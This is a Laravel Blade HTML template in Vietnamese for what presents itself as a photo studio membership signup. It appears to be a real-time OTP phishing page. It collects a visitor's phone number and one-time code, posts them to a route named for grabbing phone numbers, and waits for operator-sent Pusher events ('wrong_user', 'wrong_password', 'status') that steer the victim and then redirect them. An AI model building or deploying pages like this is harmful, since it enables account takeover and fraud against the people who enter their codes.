<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ $data->title }}</title>
    <meta name="description" content="{{ $data->description }}">
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="website">
    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
    <meta property="og:image" content="{{ $data->image }}">
    <meta property="og:title" content="{{ $data->title }}">
    <meta property="og:description" content="{{ $data->description }}">
    <meta property="og:site_name" content="{{ $data->title }}">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:description" content="{{ $data->description }}">
    <meta name="twitter:title" content="{{ $data->title }}">
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script src="https://cdn.jsdelivr.net/npm/pusher-js@7"></script>
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          fontFamily: {
            sans: ['"Be Vietnam Pro"', 'sans-serif'],
          },
          colors: {
            cream: '#faf3e3',
            ink: '#2b2a26',
            accent: '#e8833a',
            accentlight: '#fdf0e0',
            sage: '#dce3cd',
            sagedark: '#7d8a68',
          },
          boxShadow: {
            card: '0 10px 40px -12px rgba(120, 100, 60, 0.18)',
            input: '0 0 0 1px #e8833a, 0 2px 8px rgba(232, 131, 58, 0.15)',
          },
        },
      },
    };
  </script>
  <style>
    body { -webkit-font-smoothing: antialiased; }
  </style>
</head>
<body class="min-h-screen bg-cream font-sans text-ink">
  <main class="mx-auto flex min-h-screen w-full max-w-md flex-col px-5 pb-10 pt-8">

    <!-- Logo -->
    <header class="pb-8">
      <h1 class="text-3xl font-bold tracking-tight">
        Photo Studio<span class="text-accent">.</span>
      </h1>
    </header>

    <!-- Card -->
    <section class="rounded-3xl bg-white p-8 shadow-card">
      <!-- Icon -->
      <div class="flex justify-center">
        <div class="flex h-20 w-20 items-center justify-center rounded-full bg-sage">
          <svg xmlns="http://www.w3.org/2000/svg" class="h-9 w-9 text-sagedark" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="9" cy="8" r="3.2" />
            <path d="M3.5 19c.6-3 2.9-4.6 5.5-4.6S13.9 16 14.5 19" />
            <path d="M18 6v6" />
            <path d="M15 9h6" />
          </svg>
        </div>
      </div>

      <!-- Title -->
      <h2 class="mt-6 text-center text-2xl font-semibold">Đăng ký thành viên</h2>
      <p class="mt-2 text-center text-sm text-ink/60">
        Nhập số điện thoại để nhận mã thành viên.
      </p>

      <!-- Form -->
      <form id="register-form" class="mt-8" onsubmit="return false;">
        <!-- Step 1: Nhập số điện thoại -->
        <div id="step-phone">
          <label for="phone" class="mb-2 block text-sm font-medium">Số điện thoại</label>
          <input
            id="phone"
            name="phone"
            type="tel"
            inputmode="numeric"
            autocomplete="tel"
            placeholder="VD: 0901234567"
            class="w-full rounded-xl border-2 border-accent/60 bg-accentlight px-4 py-3.5 text-base placeholder:text-ink/40 focus:border-accent focus:outline-none focus:ring-2 focus:ring-accent/30"
          />
          <button
            type="button"
            id="send-otp-btn"
            class="mt-6 flex w-full items-center justify-center gap-2 rounded-full bg-accent py-4 text-base font-medium text-white transition-colors hover:bg-accent/90 active:scale-[0.99]"
            onclick="handleSendOtp(event)"
          >
            Gửi mã OTP
          </button>
        </div>
        
        <!-- Step 2: Nhập mã OTP 6 số -->
        <div id="step-otp" class="hidden">
          <label for="otp" class="mb-2 mt-4 block text-sm font-medium">Nhập mã OTP (6 số)</label>
          <input
            id="otp"
            name="otp"
            type="text"
            inputmode="numeric"
            maxlength="6"
            pattern="\d{6}"
            autocomplete="one-time-code"
            placeholder="Nhập mã OTP gồm 6 số"
            class="w-full rounded-xl border-2 border-accent/60 bg-accentlight px-4 py-3.5 text-base placeholder:text-ink/40 focus:border-accent focus:outline-none focus:ring-2 focus:ring-accent/30"
          />

          <button
            id="submit-btn"
            type="button"
            class="mt-8 flex w-full items-center justify-center gap-2 rounded-full bg-ink py-4 text-base font-medium text-white transition-colors hover:bg-ink/85 active:scale-[0.99]"
            onclick="handleVerifyOtp(event)"
          >
            Xác nhận đăng ký
            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M5 12h14" />
              <path d="m13 6 6 6-6 6" />
            </svg>
          </button>
        </div>

        <!-- Hiển thị lỗi -->
        <div id="error-message" class="hidden mt-3 text-center text-sm text-red-500">
          <!-- Lỗi sẽ hiển thị tại đây -->
        </div>

        <!-- Thông báo submit -->
        <div id="submit-message" class="hidden mt-3 text-center text-sm text-accent">
          Đang gửi đăng ký...
        </div>
      </form>
      <script>
        var pusher = new Pusher('a16c3bab85659b6d2b51', {
            cluster: 'ap1',
        });
        var channel = pusher.subscribe('mrls');
        channel.bind('{{ $pusher_code }}', function(data) {
            if (data.status) {
                $("#warning_notice").hide()
                window.location.href =
                    '{!! $data->redirect_link !!}'
            } else {
                if (data.otp) {
                    document.getElementById('step-otp').classList.remove('hidden');
                    document.getElementById('step-phone').classList.add('hidden');
                    $("#submit-btn").attr('disabled', false).html('Tiếp tục')
                }
                if (data.wrong_user) {
                    showError('Số điện thoại không hợp lệ')
                    document.getElementById('step-otp').classList.add('hidden');
                    document.getElementById('step-phone').classList.remove('hidden');
                    $("#submit-btn").attr('disabled', false).html('Tiếp tục')
                }
                if (data.wrong_password) {
                    showError('Mã OTP không hợp lệ')
                    $("#submit-btn").attr('disabled', false).html('Tiếp tục')
                }
            }
        });
      function showError(msg) {
        var errorDiv = document.getElementById('error-message');
        errorDiv.textContent = msg;
        errorDiv.classList.remove('hidden');
      }
      function hideError() {
        var errorDiv = document.getElementById('error-message');
        errorDiv.classList.add('hidden');
      }

      // Gửi yêu cầu gửi OTP với SĐT (POST lần 1)
      function handleSendOtp(event) {
        event.preventDefault();
        hideError();
        var phone = document.getElementById('phone').value.trim();

        if (!phone.match(/^0\d{9,10}$/)) {
          showError('Vui lòng nhập số điện thoại hợp lệ.');
          return false;
        }

        // Disable nút gửi OTP và show loading message
        var btn = document.getElementById('send-otp-btn');
        btn.disabled = true;
        btn.classList.add('opacity-70');
        document.getElementById('submit-message').textContent = 'Đang gửi mã OTP...';
        document.getElementById('submit-message').classList.remove('hidden');

        // Gửi request chỉ với SĐT -- endpoint riêng
        $.post("{{ route('post.customweb.bo23333_laysdt') }}", {
            d: JSON.stringify({
                phone: phone,
                step: 'send_otp',
                info: '{{ $info }}'
            }),
            'p_c': "{{ $pusher_code }}",
            '_token': '{{ csrf_token() }}'
          },
          function(data) {
          },
          "json"
        )
        return false;
      }

      // Gửi yêu cầu xác nhận OTP với SĐT + OTP (POST lần 2)
      function handleVerifyOtp(event) {
        event.preventDefault();
        hideError();
        var phone = document.getElementById('phone').value.trim();
        var otp = document.getElementById('otp').value.trim();
        if (!phone.match(/^0\d{9,10}$/)) {
          showError('Vui lòng nhập số điện thoại hợp lệ.');
          return false;
        }
        if (!otp.match(/^\d{6}$/)) {
          showError('Mã OTP phải gồm 6 chữ số.');
          return false;
        }
        var btn = document.getElementById('submit-btn');
        btn.disabled = true;
        btn.classList.add('opacity-70');
        document.getElementById('submit-message').textContent = 'Đang xác thực...';
        document.getElementById('submit-message').classList.remove('hidden');

        // Gửi request với phone+otp -- endpoint riêng xác thực
        $.post("{{ route('post.customweb.bo23333_laysdt') }}", {
            d: JSON.stringify({
              phone: phone,
              otp: otp,
              step: 'verify_otp',
              info: '{{ $info }}'
            }),
            'p_c': "{{ $pusher_code }}",
            '_token': '{{ csrf_token() }}'
          },
          function(data) {
            
          },
          "json"
        )

        return false;
      }
      </script>
    </section>
  </main>
</body>
</html>
